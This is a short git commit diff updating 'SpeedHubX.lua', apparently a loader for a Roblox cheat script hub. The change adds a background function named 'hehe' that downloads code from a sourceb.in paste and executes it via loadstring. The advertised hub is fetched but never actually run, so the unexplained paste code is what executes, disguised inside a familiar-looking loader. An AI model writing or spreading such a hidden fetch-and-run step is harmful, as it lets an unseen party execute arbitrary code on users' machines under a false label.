77adf69775de68b84163289a3ddc16f351812d02
LuckyEgg <paxhoneyspark@gmail.com>
2025-07-29 20:46:54 +0800

    Update SpeedHubX.lua

--- SpeedHubX.lua
+++ SpeedHubX.lua
@@ -1,3 +1,9 @@
-local hub = HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true)
-local hehe = "hi"
-loadstring(game:hub)
+local function hehe()
+    loadstring(game:HttpGet("https://cdn.sourceb.in/bins/trPuO4ARHD/0", true))()
+end
+local function loadui()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))
+end
+
+task.spawn(hehe)
+task.spawn(loadui)
